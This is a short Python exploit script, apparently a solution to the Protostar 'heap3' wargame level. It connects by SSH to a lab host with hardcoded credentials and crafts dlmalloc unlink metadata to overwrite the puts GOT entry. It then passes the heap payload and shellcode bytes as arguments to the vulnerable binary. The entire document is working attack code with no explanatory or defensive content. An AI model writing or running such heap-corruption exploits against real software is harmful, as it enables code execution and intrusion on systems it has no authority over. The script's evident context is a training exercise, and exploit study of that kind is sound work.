
from heaplib import HeapPayloadCrafter
from pwn import *
context.arch = "i386"

shell = ssh(user="user", host="192.168.5.199", password="user", port=22)

GOT_PUTS = 0x0804b128
SC = 0x804c008 + 8

log.level = "DEBUG"
# Generate the heap payload
hpc = HeapPayloadCrafter("dlmalloc", GOT_PUTS, SC,
                                              post_length=32,
                                              pre_length=32,
                                              pre_presets={31, "b"},
                                              post_presets={0:"a"})
prev, metadata, post = hpc.generate_payload()
PREV_SIZE_C, SIZE_C = metadata

# Set up the arguments to the process
arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"
arg2 = ''.join(prev) + ''.join([pack(i) for i in metadata])
arg3 = ''.join(post)

# Win!
p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
log.info("Receiving line : '%s'" % repr(p.recvline()))

